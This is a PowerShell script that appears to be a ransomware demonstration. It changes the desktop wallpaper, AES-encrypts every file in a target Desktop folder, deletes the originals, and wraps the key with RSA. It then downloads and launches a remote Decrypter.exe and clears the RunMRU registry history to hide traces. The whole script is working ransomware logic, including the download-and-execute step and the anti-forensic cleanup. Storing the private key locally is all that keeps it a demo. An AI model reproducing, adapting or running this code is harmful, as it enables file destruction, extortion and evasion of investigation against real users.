# Paths ------------------------
$tempPath = [System.IO.Path]::Combine([System.Environment]::GetEnvironmentVariable("SystemRoot"), "Temp")
$privateKeyFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
$folderToEncrypt = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "Wallpaper")
$decrypterFolder = [System.Environment]::GetFolderPath('Desktop')

$backgroundURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/res/black-solid-color-background.jpg"
$decrypterURL = "https://raw.githubusercontent.com/V4T3X/RansomwareDemo/refs/heads/main/Decrypter.exe"
# ------------------------------

# Change the desktop background
Invoke-WebRequest $backgroundURL -OutFile "$tempPath\black.jpg"

$setWallpaperSrc = @"
using System.Runtime.InteropServices;

public class Wallpaper
{
    public const int SetDesktopWallpaper = 20;
    public const int UpdateIniFile = 0x01;
    public const int SendWinIniChange = 0x02;

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public static void SetWallpaper(string path)
    {
        SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
    }
}
"@
Add-Type -TypeDefinition $setWallpaperSrc
[Wallpaper]::SetWallpaper("$tempPath\black.jpg")

# ----- Encryption ----- 

# Function to encrypt a file using AES
function Encrypt-File {
    param (
        [string]$inputFile,  
        [string]$outputFile, 
        [byte[]]$key
    )

    # Initialize AES for encryption
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    # Generate an initialization vector (IV) for encryption
    $aes.GenerateIV()
    $iv = $aes.IV

    # Create the output file and write the IV into it
    $fsOutput = [System.IO.File]::Create($outputFile)
    $fsOutput.Write($iv, 0, $iv.Length)

    # Create the encryption stream
    $encryptor = $aes.CreateEncryptor()
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fsOutput, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    # Open the input file and read it in chunks
    $fsInput = [System.IO.File]::OpenRead($inputFile)
    $buffer = New-Object byte[] 4096
    $bytesRead = 0

    while (($bytesRead = $fsInput.Read($buffer, 0, $buffer.Length)) -gt 0) {
        $cryptoStream.Write($buffer, 0, $bytesRead)
    }

    # Close the streams
    $cryptoStream.Close()
    $fsInput.Close()
    $fsOutput.Close()
    $aes.Dispose()

    # Remove the original file after encryption
    Remove-Item -Path $inputFile
}

# Generate an AES encryption key
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.GenerateKey()
$aesKey = $aes.Key
$aes.Dispose()

# Encrypt all files in the target folder
$files = Get-ChildItem -Path $folderToEncrypt -File
foreach ($file in $files) {
    $outputFile = Join-Path -Path $folderToEncrypt -ChildPath ($file.Name + ".enc")
    Encrypt-File -inputFile $file.FullName -outputFile $outputFile -key $aesKey
}

# ----- RSA Key Generation and Encryption ----- 

# Generate an RSA key pair
$rsa = [System.Security.Cryptography.RSA]::Create(4096)

# Encrypt the AES key with the RSA public key
$encryptedAESKey = $rsa.Encrypt($aesKey, [System.Security.Cryptography.RSAEncryptionPadding]::Pkcs1)

# Store the encrypted AES key in a file
$encryptedAESKeyPath = Join-Path -Path $tempPath -ChildPath "encrypted_AES_Key.bin"
[System.IO.File]::WriteAllBytes($encryptedAESKeyPath, $encryptedAESKey)

# Store the private RSA key in an XML file
$privateKeyPath = Join-Path -Path $privateKeyFolder -ChildPath "privateKey.xml"
$privateKeyXml = $rsa.ToXmlString($true)
[System.IO.File]::WriteAllText($privateKeyPath, $privateKeyXml)
$rsa.Dispose()

# ---------------------

Start-Sleep 2

# Download and execute the Decrypter
$decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
Invoke-WebRequest -Uri $decrypterURL -OutFile $decrypterPath
Start-Process -FilePath $decrypterPath

# Remove all RunMRU (Run History) entries from the Windows registry to hide traces
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
